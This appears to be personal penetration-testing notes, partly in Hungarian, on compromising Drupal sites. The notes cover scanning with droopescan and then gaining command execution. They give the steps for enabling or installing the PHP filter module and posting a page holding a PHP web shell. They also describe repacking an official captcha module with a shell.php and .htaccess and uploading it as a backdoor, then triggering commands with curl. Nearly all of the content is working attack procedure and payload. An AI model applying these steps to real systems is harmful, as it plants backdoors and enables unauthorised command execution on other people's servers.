# drupal
## scanning
sudo pip3 install droopescan  
droopescan scan drupal -u http://10.10.10.1/  
## exploiting
nehezebb tema mint a wordpress vagy joomla eseteben
### leveraging the php filter module
#### new versions than 8 need the installation of the module as well (before version 8 it has to be skipped)
* wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
* nem kell kicsomagolni
* login as admin
* go to Administration / Reports / Available updates (maybe under the Extend menu instead)
* 'Upload a module or theme archive to install'
* talozzuk ki a letoltott archive file-t
* install
#### older Drupal versions contains the module by default - before 8
* login as admin
* 1
  * choose modules
  * enable 'php filter'
  * save configuration (lent)
* 2
  * go to Content / Add content
  * create basic page
  * insert web shell script like: <?php system($_GET['cmd']); ?>
  * text format -> php code
  * save
* 3
  * we will be redirected to the new page like: http://10.10.10.1/node/3
  * append web shell param, and call it
    * curl -s http://10.10.10.1/node/3?cmd=id
### uploading a backdoored module
* login as admin (or some similar high priv user) (dont know which can be fine....)
* download a standard module from official repo
* e.g.
  * wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
* tar xvf captcha-8.x-1.2.tar.gz
* create new file with web shell content like shell.php: <?php system($_GET['cmd']); ?>
* create a .htaccess file with below content
<code>
 <IfModule mode_rewrite.c>
  RewriteEngine On
  RewriteBase /
 </IfModule>
</code>
* mov these two files (shell.php, .htaccess) into the module folder and zip it back
  * mv shell.php .htaccess captcha
  * tar cvf captcha.tar.gz captcha/
* click 'Manage' / 'Extend' / + Install new module
* you are on the install page, like:   http://10.10.10.1/admin/modules/install
* browse local archive file, click Install
* run rce
  * curl -s http://10.10.10.1/modules/captcha/shell.php?cmd=id
